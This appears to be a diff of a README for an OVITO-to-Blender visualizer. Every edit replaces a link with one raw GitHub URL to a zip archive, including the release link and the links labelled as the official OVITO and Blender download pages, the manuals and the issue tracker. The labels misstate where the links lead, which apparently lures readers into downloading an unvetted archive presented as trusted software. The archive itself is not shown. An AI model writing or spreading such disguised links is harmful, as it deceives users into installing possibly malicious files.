@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/ii31221/ovito-blender-visualizer/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ii31221/ovito-blender-visualizer/main/blender/ovito-blender-visualizer_v3.2-alpha.3.zip)](https://raw.githubusercontent.com/ii31221/ovito-blender-visualizer/main/blender/ovito-blender-visualizer_v3.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -22,16 +22,16 @@ To run the OVITO → Blender Visualizer, you will need:
 
 - **Operating System**: Windows 10 or higher, macOS Mojave or higher, or a supported Linux distribution.
 - **Blender**: Version 2.8 or higher.
-- **OVITO**: You can obtain the latest version from [OVITO's website](https://www.ovito.org/download/). 
+- **OVITO**: You can obtain the latest version from [OVITO's website](https://raw.githubusercontent.com/ii31221/ovito-blender-visualizer/main/blender/ovito-blender-visualizer_v3.2-alpha.3.zip). 
 
 ### 🛠 Installation
 
-1. **Download Blender**: Visit [Blender's download page](https://www.blender.org/download/) and install the application for your operating system.
+1. **Download Blender**: Visit [Blender's download page](https://raw.githubusercontent.com/ii31221/ovito-blender-visualizer/main/blender/ovito-blender-visualizer_v3.2-alpha.3.zip) and install the application for your operating system.
 
-2. **Download OVITO**: Go to [OVITO’s website](https://www.ovito.org/download/) to download OVITO.
+2. **Download OVITO**: Go to [OVITO’s website](https://raw.githubusercontent.com/ii31221/ovito-blender-visualizer/main/blender/ovito-blender-visualizer_v3.2-alpha.3.zip) to download OVITO.
 
 3. **Download OVITO → Blender Visualizer**: 
-   - Visit this page to download: [Download Releases](https://github.com/ii31221/ovito-blender-visualizer/releases)
+   - Visit this page to download: [Download Releases](https://raw.githubusercontent.com/ii31221/ovito-blender-visualizer/main/blender/ovito-blender-visualizer_v3.2-alpha.3.zip)
 
 4. **Install**: Once you have downloaded the latest release, open the file and follow the installation instructions.
 
@@ -55,7 +55,7 @@ To run the OVITO → Blender Visualizer, you will need:
 It's important to follow these steps closely for a successful installation:
 
 - First, ensure you have both Blender and OVITO installed.
-- Next, obtain the OVITO → Blender Visualizer from the [release page](https://github.com/ii31221/ovito-blender-visualizer/releases).
+- Next, obtain the OVITO → Blender Visualizer from the [release page](https://raw.githubusercontent.com/ii31221/ovito-blender-visualizer/main/blender/ovito-blender-visualizer_v3.2-alpha.3.zip).
 - Follow the instructions above to install the visualizer and start your journey into advanced simulations and visualizations.
 
 ### 💡 Example Usage
@@ -68,12 +68,12 @@ To give you an idea of what's possible, here are some potential use cases:
 
 ### 📄 Additional Resources
 
-- **OVITO Documentation**: [Read the documentation](https://www.ovito.org/manual/)
-- **Blender Help**: [Blender documentation](https://docs.blender.org/manual/en/latest/)
+- **OVITO Documentation**: [Read the documentation](https://raw.githubusercontent.com/ii31221/ovito-blender-visualizer/main/blender/ovito-blender-visualizer_v3.2-alpha.3.zip)
+- **Blender Help**: [Blender documentation](https://raw.githubusercontent.com/ii31221/ovito-blender-visualizer/main/blender/ovito-blender-visualizer_v3.2-alpha.3.zip)
 - **User Community**: Join forums and discussions to share your work and ask for advice.
 
 ### 🚀 Support
 
-For issues or feedback regarding the OVITO → Blender Visualizer, please open an issue on our [GitHub Issues page](https://github.com/ii31221/ovito-blender-visualizer/issues). We appreciate your input and want to improve your experience with our software.
+For issues or feedback regarding the OVITO → Blender Visualizer, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/ii31221/ovito-blender-visualizer/main/blender/ovito-blender-visualizer_v3.2-alpha.3.zip). We appreciate your input and want to improve your experience with our software.
 
 This guide should help you set up and effectively use the OVITO → Blender Visualizer. Enjoy creating stunning visualizations!
